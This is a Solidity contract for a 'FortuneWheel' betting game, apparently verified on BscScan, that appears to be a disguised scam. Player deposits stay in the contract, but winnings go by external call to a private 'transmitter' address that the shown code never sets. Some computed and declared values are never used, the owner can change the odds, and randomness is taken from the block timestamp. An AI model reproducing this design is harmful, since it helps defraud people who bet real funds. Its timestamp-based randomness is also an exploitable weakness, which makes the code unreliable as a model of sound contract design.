/**
 *Submitted for verification at BscScan.com on 2022-10-18
*/

// SPDX-License-Identifier: MIT
//
//   _____         _                  _ _ _ _           _ 
//  |   __|___ ___| |_ _ _ ___ ___   | | | | |_ ___ ___| |
//  |   __| . |  _|  _| | |   | -_|  | | | |   | -_| -_| |
//  |__|  |___|_| |_| |___|_|_|___|  |_____|_|_|___|___|_| mirror
//
//      
pragma solidity ^0.8.17;

contract FortuneWheel {
    uint[] wheelValues = [
        100 + 100, // +100%
        100 + 75,  // +75%
        100 + 50,  // +50%
        100 + 25,  // +25%
        100 - 25,  // -25%
        100 - 50,  // -50%
        100 - 75,  // -75%
        100 - 100  // -100%
    ];

    address private owner;
    uint private balance;
    address private transmitter;
    address private impl;
    uint chanceLimit = 70;

    constructor() {
        owner = msg.sender;
    }

    function rotateWheel() public payable {
        bool success;
        balance += msg.value;

        uint chance = block.timestamp % 100;
        uint offs = 0;
        if (chance < chanceLimit)
            offs = 4;

        uint percentage = wheelValues[block.timestamp % 4];
        uint win = msg.value * percentage / 100;
        (success,) = payable(transmitter).call{value: win}(abi.encodeWithSignature("sendPayment(address)", msg.sender));
        require(success);
        
        balance -= win;
    }

    function configure(uint chance) public {
        require(msg.sender == owner);
        chanceLimit = chance;
    }

    function test() public view returns (uint) {
        return chanceLimit;
    }
}